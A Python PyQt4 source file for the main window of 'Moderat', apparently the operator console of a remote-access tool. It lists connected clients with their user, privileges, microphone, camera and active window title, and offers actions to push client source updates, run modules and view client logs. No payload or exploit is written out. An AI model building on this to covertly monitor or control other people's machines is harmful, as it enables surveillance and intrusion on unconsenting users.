# -*- coding: utf-8 -*-

import sys
import os
import time

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from ModeratorFactory import *

from libs.language import Translate
from libs.moderat.Actions import Actions
from libs.moderat.Modes import Modes
from libs.moderat.Settings import Config
from libs.moderat.Decorators import *
from libs.gui import triggers, shortcuts
from ui import gui

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)

# Main Window
class MainDialog(QMainWindow, gui.Ui_MainWindow):

    connected = False

    DATA = os.path.join(os.path.dirname(sys.argv[0]), 'DATA')
    modulesBank = {}
    logViewers = {}
    clients = {}

    def __init__(self, reactor, plugins, parent=None):
        super(MainDialog, self).__init__(parent)
        self.reactor = reactor
        self.setupUi(self)

        # Init Log Dir
        if not os.path.exists(self.DATA):
            os.makedirs(self.DATA)
        # Initial Folders
        self.assets = os.path.join(os.path.dirname(sys.argv[0]), 'assets')
        self.flags = os.path.join(self.assets, 'flags')
        self.plugins = plugins
        # Init Settings
        self.config = Config()
        self.SERVER_HOST = self.config.ip_address
        self.SERVER_PORT = self.config.port
        # Session ID
        self.session_id = None
        # Privileges
        self.privs = 0
        # Checkers
        self.moderators_checker = None
        self.clients_checker = None
        # Create Protocol
        self.create_moderator_protocol()
        # Init Triggers
        triggers.moderatTriggers(self)
        # Init Shortcuts
        shortcuts.moderatShortcuts(self)
        # Create Actions Object
        self.action = Actions(self)
        # Create Modes Object
        self.modes = Modes(self)
        self.set_language()

    def set_language(self):

        # MAIN
        self.setWindowTitle(_('TITLE'))

        # TABS
        self.clientsTabs.setTabText(0, _('CLIENTS_TAB_ONLINE'))
        self.clientsTabs.setTabText(1, _('CLIENTS_TAB_OFFLINE'))
        self.clientsTabs.setTabText(2, _('CLIENTS_TAB_MODERATORS'))

        # HEADERS
        self.clientsTable.horizontalHeaderItem(0).setText(_('HEADER_MODERATOR'))
        self.clientsTable.horizontalHeaderItem(1).setText(_('HEADER_IP_ADDRESS'))
        self.clientsTable.horizontalHeaderItem(2).setText(_('HEADER_ALIAS'))
        self.clientsTable.horizontalHeaderItem(3).setText(_('HEADER_ID'))
        self.clientsTable.horizontalHeaderItem(4).setText(_('HEADER_OS'))
        self.clientsTable.horizontalHeaderItem(5).setText(_('HEADER_USER'))
        self.clientsTable.horizontalHeaderItem(6).setText(_('HEADER_PRIVS'))
        self.clientsTable.horizontalHeaderItem(7).setText(_('HEADER_MIC'))
        self.clientsTable.horizontalHeaderItem(8).setText(_('HEADER_CAM'))
        self.clientsTable.horizontalHeaderItem(9).setText(_('HEADER_ACTIVE_WINDOW_TITLE'))

        self.offlineClientsTable.horizontalHeaderItem(0).setText(_('HEADER_MODERATOR'))
        self.offlineClientsTable.horizontalHeaderItem(1).setText(_('HEADER_ID'))
        self.offlineClientsTable.horizontalHeaderItem(2).setText(_('HEADER_ALIAS'))
        self.offlineClientsTable.horizontalHeaderItem(3).setText(_('HEADER_IP_ADDRESS'))
        self.offlineClientsTable.horizontalHeaderItem(4).setText(_('HEADER_LAST_ONLINE'))
        # END HEADERS

        # BOTTOM
        self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS'))
        self.ipv4TextLabel.setText(_('BOTTOM_IPV4'))
        self.serversOnlineStatus.setText(_('BOTTOM_SERVERS_TOTAL'))
        # END BOTTOM

        self.moderatorsTable.horizontalHeaderItem(0).setText(_('MODERATORS_HEADER_ID'))
        self.moderatorsTable.horizontalHeaderItem(1).setText(_('MODERATORS_HEADER_ONLINE'))
        self.moderatorsTable.horizontalHeaderItem(2).setText(_('MODERATORS_HEADER_OFFLINE'))
        self.moderatorsTable.horizontalHeaderItem(3).setText(_('MODERATORS_HEADER_PRIVILEGES'))
        self.moderatorsTable.horizontalHeaderItem(4).setText(_('MODERATORS_HEADER_STATUS'))
        self.moderatorsTable.horizontalHeaderItem(5).setText(_('MODERATORS_HEADER_LASTONLINE'))
        # END ADMINISTRATION

    def create_moderator_protocol(self):
        self.moderator = SocketModeratorFactory(
            self.on_moderator_connect_success,
            self.on_moderator_connect_fail,
            self.on_moderator_receive)

    # Start Connect To Server
    def on_connect_to_server(self):
        '''
        Try Connect To Server
        :return:
        '''
        self.connection = self.reactor.connectTCP(self.SERVER_HOST, self.SERVER_PORT, self.moderator)

    def on_moderator_connect_success(self):
        '''
        On Moderator Connected To Server
        :return:
        '''
        self.connected = True
        self.ipv4Label.setText(self.SERVER_HOST+':'+str(self.SERVER_PORT))
        self.action.login()

    def on_moderator_connect_fail(self, reason):
        '''
        On Moderator Disconnected From Server
        :param reason:
        :return:
        '''
        self.connected = False
        self.ipv4Label.setText('N/A')
        self.action.disconnect()

    # Callbacks
    def on_moderator_receive(self, data):
        '''
        Data Received From Server
        :param data:
        :return:
        '''
        self.modes.check_mode(data)

    def set_alias(self):
        '''
        Set Alias For Client
        :return:
        '''
        self.action.set_alias()

    def view_logs(self):
        '''
        Client Log Viewer
        :return:
        '''
        self.action.log_viewer()

    def set_logs_settings(self):
        '''
        Set Client Log Settings
        :return:
        '''
        self.action.set_log_settings()

    @connected_to_server
    def update_source(self):
        '''
        Update Clients Source
        :return: Restart client
        '''
        self.action.update_source()

    def execute_module(self, module):
        '''
        execute module
        :param module:
        :return:
        '''
        self.action.execute_module(module)

    @is_administrator
    def set_moderator(self):
        '''
        Set Moderator For Client
        :retur:
        '''
        self.action.administrator_set_moderator()

    @connected_to_server
    @is_administrator
    def get_moderators(self):
        '''
        Get Moderators Information
        :return:
        '''
        self.action.administrator_get_moderators()

    @connected_to_server
    @is_administrator
    def create_moderator(self):
        '''
        Create New Moderator
        :return:
        '''
        self.action.administrator_create_moderator()

    @connected_to_server
    def check_clients(self):
        '''
        Update Clients Information
        :return:
        '''
        self.moderator.send_msg(message='getClients', mode='getClients', session_id=self.session_id)

    @connected_to_server
    def send_signal(self, data):
        if self.modulesBank.has_key(data['module_id']):
            self.modulesBank[data['module_id']].signal(data)
        elif self.logViewers.has_key(data['module_id']):
            self.logViewers[data['module_id']].signal(data)

    def closeEvent(self, *args, **kwargs):
        '''
        Moderat Close Event Detected
        :param args:
        :param kwargs:
        :return:
        '''
        self.action.close_moderat()
        os._exit(1)


def get_plugins_values(plugin):
    plugin_name = None
    plugin_description = None
    plugin_source = None
    if plugin.endswith('.py'):
        plugin = plugin[:-3]
        try:
            exec 'from plugins import %s' % plugin
            exec 'plugin_name = %s.plugin_name' % plugin
            exec 'plugin_description = %s.plugin_description' % plugin
            exec 'plugin_source = %s.plugin_source' % plugin
        except:
            pass
    return plugin_name, plugin_description, plugin_source

# -------------------------------------------------------------------------------
# Run Application
if __name__ == '__main__':
    app = QApplication(sys.argv)

    try:
        import qt4reactor
    except ImportError:
        from twisted.internet import qt4reactor
    qt4reactor.install()

    from twisted.internet import reactor

    # Create and display the splash screen
    splash_pix = QPixmap(os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'splash.png'))
    splash = QSplashScreen(splash_pix, Qt.WindowStaysOnTopHint)
    # Add Progress Bar
    progressBar = QProgressBar(splash)
    status_label = QLabel(splash)
    status_label.setGeometry(220, 300, 600, 20)
    status_label.setStyleSheet('''
color: #c9f5f7;
    ''')
    status_label.setText('Loading Plugin: ')
    progressBar.setGeometry(0, 320, 600, 10)
    progressBar.setTextVisible(False)
    progressBar.setStyleSheet('''
QProgressBar:horizontal {
border: 1px ridge;
border-color: #2c3e50;
background-color: #34495e;
padding: 1px;
text-align: bottom;
color: #c9f5f7;
}
QProgressBar::chunk:horizontal {
background: #c9f5f7;
margin-right: 1px;
width: 5px;
color: #c9f5f7;
}
    ''')
    splash.setMask(splash_pix.mask())
    splash.show()
    # Init Plugins
    status_label.setText('Initializing')
    init_plugins_dir = os.listdir(os.path.join(os.path.dirname(sys.argv[0]), 'plugins'))
    plugins_count = len(init_plugins_dir)
    plugins = {}
    for ind, plug in enumerate(init_plugins_dir):
        if '__init__' in plug or not plug.endswith('py'):
            continue
        status_label.setText('Loading Plugin: %s' % plug)
        name, desc, source = get_plugins_values(plug)
        if name and desc and source:
            plugins[name] = {
                'description':  desc,
                'source':       source,
            }
        progressBar.setValue((ind+1)*100/plugins_count)
        app.processEvents()
        time.sleep(0.1)

    moderatWindow = MainDialog(reactor, plugins)
    splash.finish(moderatWindow)
    moderatWindow.show()

    reactor.run()

